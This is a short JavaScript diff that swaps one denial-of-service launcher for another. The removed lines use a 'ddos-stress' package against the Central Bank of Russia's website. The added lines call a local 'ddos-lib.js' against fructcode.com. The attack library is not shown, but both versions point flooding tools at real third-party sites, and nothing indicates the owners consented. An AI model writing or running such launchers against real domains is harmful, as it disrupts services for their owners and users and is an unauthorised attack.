@@ -1,7 +1,9 @@
-var Stress = require('ddos-stress');
+const DDos = require('./ddos-lib.js');
 
-// Create new instance of DDoS Stress
-var stress = new Stress();
+const ddos = new DDos();
 
-// Run stress on server
-stress.run('http://www.cbr.ru/',10);
+try {
+  ddos.run(20, 'fructcode.com', '/');
+} catch (e){
+  console.log(e, 1212)
+}
